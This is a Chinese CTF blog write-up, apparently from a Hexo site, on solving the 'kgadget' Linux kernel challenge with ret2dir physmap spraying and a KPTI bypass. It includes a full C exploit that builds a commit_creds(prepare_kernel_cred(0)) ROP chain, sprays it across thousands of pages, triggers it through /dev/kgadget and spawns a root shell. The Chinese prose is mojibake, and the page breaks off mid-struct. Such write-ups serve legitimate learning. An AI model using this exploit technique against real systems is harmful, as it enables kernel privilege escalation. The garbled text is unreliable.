<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æˆ‘çš„åšå®¢">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="æˆ‘çš„åšå®¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/05/ret2dir-KPTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/ret2dir-KPTI/" class="post-title-link" itemprop="url">ret2dir&KPTI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-06-05 23:16:49 / ä¿®æ”¹æ—¶é—´ï¼š23:17:30" itemprop="dateCreated datePublished" datetime="2022-06-05T23:16:49+08:00">2022-06-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dir-amp-KPTI"><a href="#ret2dir-amp-KPTI" class="headerlink" title="ret2dir&amp;KPTI"></a>ret2dir&amp;KPTI</h1><p>è®°å½•ä¸€ä¸‹è¥¿ç”µçš„kgadgetè§£é¢˜è¿‡ç¨‹ä»¥åŠå­¦åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ‹–äº†ä¸€ä¸ªå¤šæœˆäº†ï¼Œè¿˜æ˜¯å¾ˆæœ‰è´¨é‡çš„ä¸€é“é¢˜ï¼Œæ˜¯å­¦ä¹ ret2dirå¾ˆå¥½çš„æ¿å­é¢˜ã€‚</p>
<h2 id="0x1-ret2dir"><a href="#0x1-ret2dir" class="headerlink" title="0x1 ret2dir"></a>0x1 ret2dir</h2><h3 id="0x1-1-åŸç†"><a href="#0x1-1-åŸç†" class="headerlink" title="0x1.1 åŸç†"></a>0x1.1 åŸç†</h3><p>è¿™æ˜¯2014å¹´æå‡ºçš„ä¸€ä¸ªæ”»å‡»æ‰‹æ®µï¼Œä¸»è¦æ˜¯çœ‹è®ºæ–‡çš„ç¿»è¯‘ç†è§£çš„ï¼ˆæ´‹æ–‡çœŸçš„çœ‹ä¸ä¸‹å»ï¼‰ï¼Œç†è§£äº†ä»¥året2dirçš„åŸç†ä¹Ÿä¸æ˜¯éå¸¸å¤æ‚ï¼Œä¸»è¦å°±æ˜¯ä¾é å†…æ ¸åœ°å€ç©ºé—´çš„ä¸€æ®µåœ°å€(physmap)å’Œç‰©ç†åœ°å€çº¿æ€§æ˜ å°„é€ æˆçš„åˆ«ååœ°å€æ¥ç»•è¿‡smepå’Œsmapã€‚</p>
<p><img src="https://p1.ssl.qhimg.com/t01b3da93b49c8c210f.png" alt="img"></p>
<p>ä¸Šå›¾æ˜¯å†…æ ¸çš„è™šæ‹Ÿåœ°å€æ®µï¼Œå…¶ä¸­<code>physmap</code>å°±å¤„äº<code>0xffff888000000000 - 0xffffc87fffffffff</code>,è¿™æ®µåœ°å€å¯¹åº”çš„å†…å­˜å¤§å°ä¸€å…±æ˜¯64TBï¼Œåœ¨x86_64ç³»ç»Ÿä¸­ï¼Œphysmapç›´æ¥ä»¥1:1çš„æ–¹å¼è¿›è¡Œæ˜ å°„ï¼Œä»0é¡µè¡¨å¼€å§‹ï¼Œå°†æ•´ä¸ªRAMæ”¾è¿›64Tçš„åŒºåŸŸä¸­ï¼Œæˆ‘ç†è§£çš„å°±æ˜¯64ä½æ¶æ„ä¸‹ï¼Œ<code>physmap</code>æ˜ å°„äº†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ã€‚æ‰€ä»¥ç”¨æˆ·æ€å¯¹åº”çš„ç‰©ç†å†…å­˜ä¹Ÿè¢«<code>physmap</code>æ˜ å°„,è¿™å°±ä¼šé€ æˆåˆ«ååœ°å€çš„å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å¥½ropæˆ–è€…shellcodeï¼Œç„¶ååœ¨å†…æ ¸æ€é€šè¿‡<code>physmap</code>å°±å¯ä»¥è®¿é—®åˆ°ï¼Œæ­¤æ—¶ä¸ä¼šè§¦å‘smepå’Œsmapï¼Œå› ä¸º<code>physmap</code>æœ¬èº«å°±å¤„äºå†…æ ¸æ€çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå±äºå†…æ ¸æ€çš„å†…å®¹ã€‚</p>
<h3 id="0x1-2-åˆ©ç”¨æ–¹å¼"><a href="#0x1-2-åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x1.2 åˆ©ç”¨æ–¹å¼"></a>0x1.2 åˆ©ç”¨æ–¹å¼</h3><p>ä¸€å…±æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼</p>
<p><strong>ç²¾å‡†å‘½ä¸­</strong>:å¯ä»¥é€šè¿‡mmapç”³è¯·ä¸€é¡µå¤§å°çš„å†…å®¹ï¼Œç„¶ååœ¨ä¸Šé¢å†™ä¸Šè‡ªå·±çš„ropæˆ–è€…shellcode.ç„¶åé€šè¿‡kmallocç”³è¯·å †ï¼Œè¿™ä¸ªå †æ¥è‡ªäº<code>physmap</code>çº¿æ€§æ˜ å°„åŒº(physmapçš„å­˜åœ¨å°±æ˜¯æ–¹ä¾¿kmalloc),ç„¶åæ³„éœ²å †çš„åœ°å€ï¼Œå°±å¯ä»¥çŸ¥é“<code>physmap</code>çš„åŸºåœ°å€äº†ï¼Œç„¶åè¿›è¡Œå†…å­˜æœç´¢ï¼Œæ‰¾åˆ°ropæˆ–è€…shellcodeçš„çº¿æ€§æ˜ å°„åœ°å€æ¥getshell.</p>
<p><strong>æ¦‚ç‡å‘½ä¸­</strong>:å­¦åå«<code>physmap spray</code>,é€šè¿‡mmapå¤§é‡çš„é¡µåœ°å€ï¼Œç„¶åå…¨éƒ¨å†™ä¸Šç›¸åŒçš„ropæˆ–è€…shellcode,ç„¶åéšæœºæŒ‘é€‰ä¸€ä¸ª<code>physmap</code>ä¸Šä¸€ä¸ªé¡µåŸºå€è¿›è¡Œåˆ©ç”¨ã€‚åªè¦ç”³è¯·çš„è¶³å¤Ÿå¤šï¼Œå°±æœ‰å¾ˆå¤§æ¦‚ç‡å‘½ä¸­ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯é«˜ç‰ˆæœ¬çš„<code>physmap</code>åªæœ‰è¯»å†™æƒé™ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯rop.</p>
<h2 id="0x2-KPTI"><a href="#0x2-KPTI" class="headerlink" title="0x2 KPTI"></a>0x2 KPTI</h2><p>åšè¿™é“é¢˜çš„æ—¶å€™å®‰æ’å¥½æ­£å¸¸çš„è¿”å›ç”¨æˆ·æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>ï¼Œè¿”å›ç”¨æˆ·æ€åç›´æ¥çˆ†æ®µé”™è¯¯ï¼Œè·³äº†åŠå¤©ä¹Ÿæ²¡è°ƒå‡ºæ¥ä¸ªæ‰€ä»¥ç„¶ï¼Œé—®äº†ç†Šçˆ¹è¯´å’ŒKPTIæœ‰å…³æˆ‘æ‰ååº”è¿‡æ¥ã€‚</p>
<p>LPTIçš„å…·ä½“åŸç†å¯ä»¥å‚çœ‹<a target="_blank" rel="noopener" href="https://blog.csdn.net/pwl999/article/details/112686914">(12æ¡æ¶ˆæ¯) Linux mem 2.3 å†…æ ¸é¡µè¡¨éš”ç¦» (KPTI) è¯¦è§£_pwl999çš„åšå®¢-CSDNåšå®¢_å†…æ ¸é¡µè¡¨éš”ç¦»</a>ï¼Œç»•è¿‡æ–¹å¼å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006">Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå¦‚æœå¼€å¯äº†KPTIçš„è¯ï¼Œè¦æƒ³ä»å†…æ ¸æ€è¿›å…¥ç”¨æˆ·æ€ï¼Œè¿˜å¾—è®¾ç½®cr3çš„å€¼ï¼Œè®©å…¶æˆ–ä¸Š0x1000å°±è¡Œï¼Œå¯ä»¥ä½¿ç”¨gadgetæ¥å®Œæˆï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>swapgs_restore_regs_and_return_to_usermode+27</code>æ¥å®Œæˆã€‚</p>
<p>æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯å½“cr3çš„å€¼æŒ‡å‘äº†ç”¨æˆ·æ€çš„PGDä»¥åè¿˜å¾—æ‰§è¡Œå†…æ ¸æ€çš„<code>swapgs</code>å’Œ<code>iretq</code>,ä¸å°±ä¼šåœ¨TLBä¸­æ‰¾ä¸è§å¯¹åº”çš„ç‰©ç†åœ°å€äº†å—ã€‚ğŸ¤”,ç›®å‰æˆ‘è¿˜æ— æ³•è§£ç­”.</p>
<h2 id="0x3-è„šæœ¬"><a href="#0x3-è„šæœ¬" class="headerlink" title="0x3 è„šæœ¬"></a>0x3 è„šæœ¬</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp_ret=<span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xe8_pop_rbx_rbp_ret=<span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret=<span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi=<span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff8110197b</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81bb99af</span>;</span><br><span class="line"><span class="keyword">size_t</span> iretq=<span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="keyword">size_t</span> mov_rsi_rax_ret=<span class="number">0xffffffff81bbdc9c</span>;</span><br><span class="line"><span class="keyword">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="comment">// ffffffff81029e51:	48 89 c7             	mov    %rax,%rdi</span></span><br><span class="line"><span class="comment">// ffffffff81029e54:	89 d8                	mov    %ebx,%eax</span></span><br><span class="line"><span class="comment">// ffffffff81029e56:	5b                   	pop    %rbx</span></span><br><span class="line"><span class="comment">// ffffffff81029e57:	5d                   	pop    %rbp</span></span><br><span class="line"><span class="comment">// ffffffff81029e58:	48 09 f8             	or     %rdi,%rax</span></span><br><span class="line"><span class="comment">// ffffffff81029e5b:	c3                   	retq  </span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax=<span class="number">0xffffffff81029e51</span>;</span><br><span class="line"><span class="keyword">size_t</span> try_hit ;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">void</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp,user_bp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_bp, rbp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rop_chain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x40</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=add_rsp_0xa0_pop_rbx_r12_r13_rbp_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;idx&lt;(page_size/<span class="number">8</span><span class="number">-0x30</span>);idx++)&#123;</span><br><span class="line">        rop[idx]=ret;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[idx++]=pop_rdi;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=prepare_kernel_cred;</span><br><span class="line">    rop[idx++]=mov_rdi_rax;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=<span class="number">1</span>;</span><br><span class="line">    rop[idx++]=commit_creds;</span><br><span class="line">    rop[idx++]=swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++]=<span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!physmap_spray_arr[<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15000</span>;i++)&#123;</span><br><span class="line">        physmap_spray_arr[i]=mmap(<span class="literal">NULL</span>,page_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!physmap_spray_arr[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap fail\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    try_hit= <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†<code>ret2dir</code>å’Œ<code>KPTI</code>ç»•è¿‡ä»¥å¤–ï¼Œè¿˜å­¦åˆ°äº†ä¸¤ä¸ªé›¶ç¢çš„çŸ¥è¯†</p>
<p><strong>init_cred</strong>:ä¸€èˆ¬ä½¿ç”¨<code>commit_creds(prepare_kernel_cred(0))</code>æ¥å®Œæˆææƒï¼ŒåŸç†å°±æ˜¯<code>prepare_kernel_cred(0)</code>ä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„credï¼Œç„¶å<code>commit_creds()</code>å°†è¿™ä¸ªæ–°credè®¾ç½®æˆè¿™ä¸ªè¿›ç¨‹çš„cred,è¿™ä¸ªæ¯”è¾ƒéº»çƒ¦çš„ä¸€ç‚¹æ˜¯<code>mov rdi,rax,ret</code>æ¯”è¾ƒéš¾æ‰¾ï¼Œåœ¨å®˜æ–¹wpé‡Œä»–ç›´æ¥ä½¿ç”¨äº†ä¸€ä¸ªcred<code>init_cred</code>ï¼Œè¿™ä¸ªcredæ˜¯ä¸€ä¸ªrootæƒé™çš„cred,æ‰€ä»¥å¯ä»¥ç›´æ¥<code>commit_creds(init_cred)</code>,å…¶ä¸­<code>init_cred</code>å¯ä»¥ç›´æ¥åœ¨<code>/proc/kallsyms</code>ä¸­æ‰¾è§ã€‚</p>
<p><strong>pt_regs</strong>:è¿™æ˜¯ä¸€ä¸ªç”±å¯„å­˜å™¨çš„å€¼ç»„æˆçš„ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span 